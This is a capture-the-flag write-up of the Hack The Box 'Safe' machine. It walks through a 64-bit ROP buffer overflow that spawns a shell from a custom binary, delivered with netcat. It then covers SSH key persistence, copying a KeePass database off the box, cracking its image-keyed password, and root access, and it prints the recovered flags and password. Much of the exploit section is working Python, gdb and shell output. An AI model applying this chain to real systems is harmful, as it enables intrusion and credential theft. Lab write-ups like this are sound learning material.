An easy box that I found anything but! I certainly learnt a lot from this one, but it took a long time to complete.â€¦

## Introduction

This was my first experience at attempting a buffer overflow and it was tough! In all this took me around 2 weeks, as I had a bunch of reading to do on buffer overflows, the stack etc. which I hadn't thought about for years.

The writeup below might be slightly chaotic as I was trying to document what I was doing as I was learning it, but it does (mostly) seem to make sense a few months later!

## Enumeration

Starting with the usual Autorecon we find that ssh (22) and Apache (80) are running, along with an unknown services on port 1337. Looking at the page source on the webserver we can see a comment that _myapp can be downloaded to analyze from here its running on port 1337_.

Seeing that we can grab it using `wget 10.10.10.147/myapp`. Once downloaded we can see it's a 64 bit ELF executable.

## Exploit Development

After downloading myapp the first thing to do is run it do see what happens
```bash
    root@RD1734747W10:~/hackthebox/safe# ./myapp
     11:46:26 up 31 min, 1 user, load average: 1.74, 1.94, 1.80
    
    What do you want me to echo back? blah
    blah
```
Okay, so a pretty basic program that displays the uptime, asks for input and then echos it back. Two things immediately spring to mind. 1) The program is probably running an external command (uptime) and 2) There may well be a buffer overflow of some type as we can supply input (this is HTB after all).

### Check for existence of buffer overflow

Firstly we need to see if a buffer overflow exists. I'm doing this in GDB as I can see the state of the stack etc. if an overflow exists.

To begin with I use Python to generate me a bunch of characters to try and overflow the buffer with:

```python
python -c 'print "A"*500'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Next start gdb with `gdb myapp` and then run the program by using `r`

![Annotation-2019-10-09-115959](../../images/posts/2020/2020-04-30-safe-writeup/Annotation-2019-10-09-115959.png)

Once it runs we paste in all the 'A's and get a segfault and we can see a bunch of the registers are filled with 'A' so we now know the code is vulnerable to a buffer overflow.

Before we delve deeper we can use [peda](https://github.com/longld/peda) to see what security function are enabled in the binary
```bash
gdb-peda$ checksec
CANARY : disabled
FORTIFY : disabled
NX : ENABLED
PIE : disabled
RELRO : Partial
```
The key here is that NX is set to enabled which means we can't just put items on the stack and execute them, we'll need to use Return Orientated Programming (ROP). Basically this involved using gadgets, which are just pieces of existing assembly in the program, to execute the code we want. As this is a 64 bit binary we'll need to use registers to pass arguments to the functions.

So, we need to

1. Work out what the size for the buffer overflow is, so we can add our commands afterwards.
2. Find out how uptime is being called
3. Work out what gadgets we need to call something else other than uptime, like a shell

### Find size of buffer overflow

We can use _gdb peda_ to do this.

First we create a pattern
```bash
gdb-peda$ pattern create 500
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
```
Then we run _myapp_ with `r` and feed it the pattern (without the quotes). The program will SIGFAULT again.
```nasm
    RAX: 0x0 
    RBX: 0x0 
    RCX: 0x7ffff7edb504 (< __GI___ libc_write+20>:	cmp rax,0xfffffffffffff000)
    RDX: 0x7ffff7fae8c0 --> 0x0 
    RSI: 0x405260 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
    RDI: 0x0 
    RBP: 0x41414e4141384141 ('AA8AANAA')
    RSP: 0x7fffffffe208 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    RIP: 0x4011ac (<main+77>:	ret)
    R8 : 0x7ffff7fb3500 (0x00007ffff7fb3500)
    R9 : 0x0 
    R10: 0xfffffffffffff418 
    R11: 0x246 
    R12: 0x401070 (<_start>:	xor ebp,ebp)
    R13: 0x7fffffffe2e0 --> 0x1 
    R14: 0x0 
    R15: 0x0
```
Looking at the registers we are interested in the contents of RBP. This register is the frame pointer for the currently executing function and can be used to calculate the offset for RSP, which the register holding the pointer to the top of the stack. When the currently executing function finishes, the top of the stack will be popped into the RIP register. The RIP register is a pointer to the next instruction to be executed (and is read only, so we can't directly modify it).

We can use `pattern search` to calculate the offset for us, providing the contents of RBP as the argument:
```bash
gdb-peda$ pattern search AA8AANAA
Registers contain pattern buffer:
RBP+0 found at offset: 112
Registers point to pattern buffer:
[RSI] --> offset 0 - size ~203
[RSP] --> offset 120 - size ~80
```
We can see that RSP is at offset 120, so if we have a buffer overflow of 120 bytes anything after that will be written onto the stack and we can control RSP.

We can test this by generating a file that contains 120 'A' characters and then some 'B' characters, if we've got the offset correct we should see RSP being overwritten with 'B's.
```bash
root@RD1734747W10:~/hackthebox/safe# python -c 'print "A"*120 + "B"*8' > in.txt
root@RD1734747W10:~/hackthebox/safe# cat in.txt
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
```
We can the pipe this into the myapp program when run in `gdb`
```nasm
    gdb-peda$ r < in.txt
    Starting program: /root/hackthebox/safe/myapp < in.txt
    [Detaching after fork from child process 28274]

```
As you can see from the above, RSP point to address `0x7fffffffe208` which has been overwritten by 'B' characters. We now need to find something more useful to do with this.

We're going to use [radare2](https://rada.re/r/)which is a reversing framework to have a static look at the code. We start it up and then enter `aaaa` to do an analysis. We then use `afl` to list functions and then use `pdf@sym/main` to print the dissambled main function

```
We can see that at address `0x0040116e` is a call to system. The line above puts the address that stores the string _/usr/bin/uptime_ (`0x402008`) into RDI. In 64bit architectures there are a number of registers that are used to stored arguments in the following precedence:

1. RDI
2. RSI
3. RDX
4. RCX
5. R8
6. R9

So when the system call is made, it requires an argument (the command being run by system) and so we look for this in the address held by RDI. We therefore need to get a useful string, such as _/bin/bash_ into memory somewhere and update RDI to point to it before system is called.

So, now we know where system is we want to find some memory we can write to. We can use readelf for this with `readelf --sections myapp`
```nasm
    [23] .data PROGBITS 0000000000404038 00003038
           0000000000000010 0000000000000000 WA 0 0 8
```
There is more output than this, but .data is a good bet. The WA flag means it's writeable and allocable, so we can put out string here. The address to save is `0x00404038`

Now we need to find some gadgets. A few tools exist, such as ROPgadget
```nasm
    root@RD1734747W10:~/hackthebox/safe# ROPgadget --binary myapp --only "mov|pop|ret"
    Gadgets information
    ============================================================
    0x0000000000401132 : mov byte ptr [rip + 0x2f0f], 1 ; pop rbp ; ret
    0x0000000000401204 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x0000000000401206 : pop r13 ; pop r14 ; pop r15 ; ret
    0x0000000000401208 : pop r14 ; pop r15 ; ret

    0x0000000000401207 : pop rbp ; pop r14 ; pop r15 ; ret
    0x0000000000401139 : pop rbp ; ret
    0x000000000040120b : pop rdi ; ret
    0x0000000000401209 : pop rsi ; pop r15 ; ret
    0x0000000000401205 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    0x0000000000401016 : ret
```
This gets us started but in this case I found it missed some of the useful gadgets. Given this is a simple program we can use `radare2` to inspect the code. Often in CTF style challenges such as this one there is unused code that can be handy. We can see from `afl` there is a test function, so we'll take a look.
```nasm
    [0x00401070]> pdf@sym.test
    / (fcn) sym.test 10
    | sym.test ();
    | 0x00401152 55 push rbp
    | 0x00401153 4889e5 mov rbp, rsp
    | 0x00401156 4889e7 mov rdi, rsp
    \ 0x00401159 41ffe5 jmp r13
```
Okay, these might be handy, but if we jump into an instruction in this function the rest of the instructions will also execute so we'll have to bear this mind.

Logically we want to do the following

1. Overflow the buffer (with 'A') so we can take control of the stack
2. Place the string '/bin/bash' in the .data section of memory
3. Update RDI to point to the memory address that holds /bin/bash
4. Call system which will use the contents of the memory address pointed to by RDI as the argument

So, the first part is easy, we just generate a bunch of 'A' characters using Python.

The second part requires using registers as we can't just write to memory as we like and need to use the register contents as arguments.

Given we need to use the stack, we first need to get the memory address for the .data section into RDI (or similar) and then move whatever is at the top of the stack (pointed to be RSP) into the memory address pointed to by RDI.

From the ROPgadget output we can see that `0x0040120b : pop rdi ; ret` looks like it does what we want. It'll pop the top of the stack into RDI, after the overflow we want the stack to look like
```nasm
0x0040120b # POP RDI  
0x00404038 # Data address
```
So when the overflowed function returns it'll be pointing at the top of the stack which is our POP RDI instruction. Prior to being executed it'll be POPped from the stack and then on executing will POP our data address into RDI.

Next we need some way of getting our string into the memory location in RDI and then calling system.

We need to do this in a slightly round about way, due to the gadgets available to us.

Looking at the intructions in the test function we can see one that puts the contents of the memory location pointed to by RSP (the stack pointer) into the memory address pointed to by RDI, which seems like a good way of getting our /bin/bash string where we need it - `0x00401156 Â  Â  Â 4889e7 Â  Â  Â  Â  mov rdi, rsp`

This is followed by a jmp instruction - `0x00401159 Â  Â  Â 41ffe5 Â  Â  Â  Â  jmp r13`

A jmp moves execution to whatever address is pointed to. In this case the instruction is `jmp r13` so execution will move to whatever address is pointed to by r13. If we make this the address for system, we've managed to get our command executed.

So, before we call these we need a gadget to put the address for the system call into r13. From the ROPgadget output `0x0000000000401206 : pop r13 ; pop r14 ; pop r15 ; ret` will do. This pops the top three items on the stack into r13, r14 & r15 respectively, so we'll need to put some other junk on the stack.

Building this up from before we now have a stack that should look like
```nasm
0x0040120b # POP RDI  
0x00404038 # Data address (will be popped into RDI)  
0x00401206 # pop r13 ; pop r14 ; pop r15 ; ret  
0x0040116e # Address of system (will end up in r13)  
0x0040116e # Address of system (will end up in r14)  
0x0040116e # Address of system (will end up in r15)  
0x00401156 # mov rdi, rsp (move contents of RSP to address pointed to by RDI)  
'/bin/bash' # Will be moved into memory pointed to by RDI
```
Now we can write some Python to put this into operation. You can use something like [pwntools](http://docs.pwntools.com/en/stable/) but I've done it like this so I can step through it easily in `gdb` to see what is happening.
```python
    from struct import *
    
    buf = ""
    buf += "A"*120
    buf += pack("<Q", 0x00000040120b) # Pop RDI
    buf += pack("<Q", 0x00404038) # Data
    buf += pack("<Q", 0X401206) # pop r13 ; pop r14 ; pop r15 ; ret
    buf += pack("<Q", 0X0040116e) # System - r13
    buf += pack("<Q", 0X0040116e) # System - r14
    buf += pack("<Q", 0X0040116e) # System - r15
    buf += pack("<Q", 0X401156) # Move RSP to RDI
    buf += "/bin/bash"
    f = open ("exploit.txt" , "w")
    f.write(buf)
```
The `pack "<Q"` formats the data as little endian unsigned long long, so at least 64 bits in size. The order of the instruction is sometimes confusing, but it's worth remembering the stack fills from high addresses to low, so first the 'A' characters will overflow, and then the first instruction ends up on the stack, the next instruction below etc. The stack outputs below will help this make sense.

The code builds a variable with the commands in the right sequence and then outputs it to a file which we can pass to `gdb` as before.
```bash
    # gdb myapp
    gdb-peda$ b main
    Breakpoint 1 at 0x401163
    gdb-peda$ r < exploit.txt

The `b main` sets a breakpoint on the main function so we can then step through the code using _n._

This is the state just after the buffer overflow. Everything is a mess but we need to step through until the function is about to return. At this point it'll look at the top of the stack for the next command to execute, which will be the start of our instructions

So we can see r13, r14 and r15 hold the address of system. RDI points to memory contains "/bin/bash" and the instruction pointer (RIP) points to the address of system, thanks to the jmp r13. Running the code in gdb doesn't really do anything, so now we need to test it on myapp and see if it really works.
```bash
    root@RD1734747W10:~/hackthebox/safe# (cat exploit.txt;cat) | ./myapp
     17:27:45 up 6:12, 1 user, load average: 2.20, 2.30, 2.23
    
â€‹    What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
â€‹      @
â€‹    whoami
â€‹    root
```

The `(cat exploit.txt;cat) | ./myapp` command sends the contents of the _exploit.txt_ file generated earlier to STDIN when `myapp` is run. The syntax may look odd, and you'd think that `./myapp < exploit.txt` would work (and it sort of does, but not over the network). The reason is detailed [here](https://security.stackexchange.com/questions/155844/using-cat-file-cat-to-run-a-simple-bof-exploit) and is basically is to do with keeping STDIN open after the exploit has run, otherwise you can't interact with the shell you've spawned as STDIN will close after the exploit has been sent.

As this worked locally, my next test was to spin `myapp` up listening on the network to simulate the real service. I did this using `nc -l -p 4096 -e ./myapp`

We can then try the exploit over the network:
```bash
    root@RD1734747W10:~/hackthebox/safe# (cat exploit.txt;cat) | nc localhost 4096
     19:52:51 up 8:37, 1 user, load average: 1.52, 1.79, 1.95
    
    whoami
    root
```
Looking good, and now to try for real against the server

## Foothold
```bash
    root@RD1734747W10:~/hackthebox/safe# (cat exploit.txt;cat) | nc 10.10.10.147 1337
     14:40:18 up 0 min, 0 users, load average: 0.10, 0.04, 0.01
    
    whoami
    user
    
    cd /home/user
    ls
    IMG_0545.JPG
    IMG_0546.JPG
    IMG_0547.JPG
    IMG_0548.JPG
    IMG_0552.JPG
    IMG_0553.JPG
    myapp
    MyPasswords.kdbx
    user.txt
    cat user.txt
    7a29ee9b0fa17ac013d4bf01fd127690
```
Phew!

Now we have a basic shell it'd be good to get something a bit more servicable. From the earlier Nmap we can see that ssh is open so we'll try copying the contents of our id\_rsa.pub file into /home/user/.ssh/authorized\_keys on the host. `chmod 600` the authorized\_keys file to avoid ssh complaining about permissions.

One this is done we try `ssh user@10.10.10.147` and we're in.

## Escalation

There are a bunch of .JPG files and a .kdbx file which is the file type associated with KeePass, a password manager. It'll be easier to examine these on our Kali box so we can tar them up and copy them across

    tar -cvf stuff.tar *.JPG *.kdbx
    scp user@10.10.10.147:stuff.tar .

A quick look at the images doesn't reveal anything special, however KeePass supports composite keys, where another file, such as an image, makes part of the key material along with the master password.

To generate some hashes in the correct format for cracking we can use `keepass2john` which comes with Kali and we'll need to do this for each of the images.
```bash
    keepass2john -k IMG_545.JPG MyPasswords.kdbx >> images.hash
```
and repeat for each image. I put all the generated hashes in one file so that john would try to each item from the worldlist against each hash. I could have created indvidual hash files but this may have meant time wasted testing against the composute key created from the wrong image.

After about 5 minutes we get the password

We don't know which image this relates to, the drawback of merging the hashes, so given there were only a small number of images I just manually tried each one.

The correct image was IMP\_0547.JPG and we get the password _bullshit._

We can then open the database in Keepass and find that there is an entry for _Root password_.

As we're logged in to _safe_ via ssh we can just use the password to `su` to root and grab the key `d7af235eb1db9fa059d2b99a6d1d5453`
